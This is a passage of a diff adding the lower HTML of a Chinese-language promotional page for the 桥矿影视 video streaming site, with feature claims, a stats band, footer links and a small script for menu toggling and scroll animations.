+          <div><b>01</b><span><strong>海量资源</strong>：十二万+影视条目，桥矿影视持续扩充资源库，热门经典全覆盖。</span></div>
+          <div><b>02</b><span><strong>高清画质</strong>：从 1080P 到 4K，多版本可选，看片不将就。</span></div>
+          <div><b>03</b><span><strong>分类齐全</strong>：按类型、地区、年代、热度多维检索，快速定位想看的内容。</span></div>
+          <div><b>04</b><span><strong>更新及时</strong>：院线大片、热播剧集同步跟进，每日排期更新不漏更。</span></div>
+        </div>
+      </div>
+      <div class="band">
+        <div class="row"><div class="n">12w+</div><div class="t">收录影视资源条目<br>桥矿影视资源库</div></div>
+        <div class="row"><div class="n">4K</div><div class="t">最高支持超清画质<br>多版本可选</div></div>
+        <div class="row"><div class="n">365</div><div class="t">全年不间断更新<br>每日排期同步</div></div>
+        <div class="row"><div class="n">0</div><div class="t">广告打扰归零<br>专注观影体验</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="shell">
+    <div class="f-top">
+      <div class="f-brand">
+        <div class="logo"><span class="mark">桥矿</span>桥矿影视<small>QIAO KUANG</small></div>
+        <p>桥矿影视（qiaokuangyingshi-wap.github.io）是桥矿影视网，海量电影、热播电视剧、综艺、动漫资源一站直达，画质高清、分类齐全、更新及时。</p>
+      </div>
+      <div class="fc"><h4>频道导航</h4><a href="#lib">影视资源库</a><a href="#drama">热播剧集</a><a href="#show">综艺频道</a><a href="#film">电影矩阵</a><a href="#sched">更新排期</a></div>
+      <div class="fc"><h4>内容分类</h4><a href="#">电影专区</a><a href="#">热播剧集</a><a href="#">综艺节目</a><a href="#">动漫专区</a><a href="#">纪录片</a></div>
+      <div class="fc"><h4>关于桥矿</h4><a href="#about">关于桥矿影视</a><a href="#">合作推广</a><a href="#">帮助中心</a><a href="#">联系我们</a><a href="#">免责声明</a></div>
+    </div>
+    <div class="f-bot">
+      <span>© <span id="yr"></span> 桥矿影视 qiaokuangyingshi-wap.github.io · ALL RIGHTS RESERVED</span>
+      <span><a href="#">隐私政策</a> / <a href="#">用户协议</a> / <a href="#">免责声明</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent = new Date().getFullYear();
+var mb = document.getElementById('mBtn'), ls = document.getElementById('links');
+mb.addEventListener('click', function(){ ls.classList.toggle('open'); });
+ls.querySelectorAll('a').forEach(function(a){ a.addEventListener('click', function(){ ls.classList.remove('open'); }); });
+var io = new IntersectionObserver(function(es){
+  es.forEach(function(e){
+    if(e.isIntersecting){ e.target.style.animation = 'rise .55s cubic-bezier(.2,.7,.2,1) both'; io.unobserve(e.target); }
+  });
+}, {threshold:.08});
+document.querySelectorAll('.node,.iron-i,.orb,.tile,.sched,.band,.giant,.mini figure').forEach(function(el){ io.observe(el); });
+var st = document.createElement('style');
+st.textContent = '@keyframes rise{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}';
+document.head.appendChild(st);
+</script>
+</body>
+</html>
